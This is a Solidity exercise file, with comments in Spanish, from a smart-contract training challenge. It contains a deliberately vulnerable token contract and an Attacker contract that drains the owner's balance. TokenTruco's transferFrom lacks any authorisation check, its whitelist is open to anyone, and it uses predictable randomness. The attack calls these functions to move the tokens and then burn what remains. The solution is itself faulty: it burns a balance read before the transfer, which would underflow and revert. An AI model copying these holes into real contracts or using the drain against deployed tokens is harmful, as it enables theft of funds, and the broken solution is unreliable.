// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

/**
 * En ese desafío se hará práctica de la interacción entre contratos.
 * Ello implica definir una interfaz e instanciar el contrato a interactuar.
 *
 * El objetivo final para pasar este desafío es dejar al owner de SimpleToken
 * con un balance de 0 cuando se revisa el mapping 'balances'.
 *
 * Este cometido debe ser logrado llamando el método 'ejecutarAtaque' del contrato Attacker.
 * Dentro de este éste método se deben realizar todas las operaciones necesarias para
 * dejar al owner de SimpleToken con un balance de 0.
 *
 * El método 'ejecutarAtaque' debe realizar las siguientes tareas:
 * - Calcular un monton aleatorio usando el método 'montoAleatorio' de SimpleToken
 * - Transferir el monto aleatorio a la cuenta del atacante usando el método 'transferFrom' de SimpleToken
 * - Agregar la cuenta del atacante a la whitelist usando el método 'addToWhitelist' de SimpleToken
 * - Calcular el restante en la cuenta del owner para quemarlo usando el metodo 'burn' de SimpleToken
 *
 * Para ejecutar este desafío correr el comando:
 * $ npx hardhat test test/EjercicioTesting_6.js
 */

// NO MODIFICAR
contract NumeroRandom {
    function montoAleatorio() public view returns (uint256) {
        return
            (uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender))) %
                1000000) + 1;
    }
}

// NO MODIFICAR
contract Whitelist {
    mapping(address => bool) public whitelist;

    modifier onlyWhiteList() {
        require(whitelist[msg.sender] == true);
        _;
    }

    function _addToWhitelist(address _account) internal {
        whitelist[_account] = true;
    }
}

// NO MODIFICAR EL CONTRATO TokenTruco
contract TokenTruco is Whitelist, NumeroRandom {
    address public owner;

    mapping(address => uint256) public balances;

    constructor() {
        owner = msg.sender;
        balances[msg.sender] = 1000000;
    }

    function transferFrom(address _from, address _to, uint256 _amount) public {
        balances[_from] -= _amount;
        balances[_to] += _amount;
    }

    function burn(address _from, uint256 _amount) public onlyWhiteList {
        // msg.sender == contrato Attacker
        balances[_from] -= _amount;
    }

    function addToWhitelist() public {
        _addToWhitelist(msg.sender);
    }
}

// Deducir la interface y los métodos que se usarán
// Mediante ITokenTruco el contrato Attacker ejecutará el ataque
interface ITokenTruco {
  function montoAleatorio() external returns (uint256);
    function owner() external view returns (address);
    function balances(address _account) external view returns (uint256);
    function transferFrom(address _from, address _to, uint256 _amount) external;
    function burn(address _from, uint256 _amount) external;
    function addToWhitelist() external;
}

// Modificar el método 'ejecutarAtaque'
contract Attacker {
    ITokenTruco public tokenTruco;
    address public attacker; // Variable para almacenar la dirección del atacante

    constructor(address _tokenTrucoAddress) {
        tokenTruco = ITokenTruco(_tokenTrucoAddress);
        attacker = msg.sender; // Almacenamos la dirección del atacante
    }
 // Eventos para diagnosticar
    event RandomAmount(uint amount);
    event TransferSuccess(bool success);
    event AttackerBalance(uint balance);

    function ejecutarAtaque() public {
      
    
        // Calcular el monto aleatorio
        uint randomAmount = tokenTruco.montoAleatorio();

        // Imprimir el monto aleatorio para diagnosticar
        emit RandomAmount(randomAmount);

        // Transferir el monto aleatorio desde el propietario del contrato TokenTruco al atacante
        uint ownerBalance = tokenTruco.balances(tokenTruco.owner());
        
        uint amountToTransfer = ownerBalance < randomAmount ? ownerBalance : randomAmount;
        

       
     // Realizar la transferencia
tokenTruco.transferFrom(tokenTruco.owner(), attacker, amountToTransfer);

    // La transferencia se realizó correctamente
    emit TransferSuccess(true);
// Verificar si la transferencia fue exitosa observando el saldo del atacante después de la transferencia
uint attackerBalanceAfterTransfer = tokenTruco.balances(attacker);

// Verificar si el saldo del atacante ha aumentado
if (attackerBalanceAfterTransfer > 0) {
    // La transferencia fue exitosa
    // Realizar alguna lógica adicional si es necesario
} else {
    // La transferencia falló o el saldo no se incrementó
    // Realizar alguna lógica de manejo de errores si es necesario
}
        // Imprimir el saldo del atacante después de la transferencia para diagnosticar
        emit AttackerBalance(tokenTruco.balances(attacker));

        // Agregar la cuenta del atacante a la whitelist
        tokenTruco.addToWhitelist();

        // Quemar todo el saldo restante del propietario del contrato TokenTruco
        tokenTruco.burn(tokenTruco.owner(), ownerBalance);
    }

   }
